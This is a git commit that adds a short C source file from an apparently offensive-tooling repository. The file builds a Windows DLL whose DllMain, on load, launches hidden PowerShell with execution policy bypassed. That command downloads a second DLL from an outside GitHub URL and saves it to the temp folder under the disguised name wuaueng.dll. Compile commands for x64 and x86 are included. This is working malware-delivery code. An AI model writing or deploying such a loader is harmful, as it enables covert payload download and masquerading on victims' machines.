49220588c94c10bc6eeefa70fc5eea51aa05e30b
JesusCries <62108395+WesleyWong420@users.noreply.github.com>
2022-12-26 00:07:11 +0800

    Add files via upload

---
+++ base/src/dll/windows_dll.c
@@ -0,0 +1,11 @@
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    if (dwReason == DLL_PROCESS_ATTACH){
+        system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -exec bypass -nop -noexit -c iwr -Uri https://raw.githubusercontent.com/WesleyWong420/Build-Your-Own-LOLBins/main/base/src/dll/byol64.dll -OutFile $env:TEMP\\wuaueng.dll");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
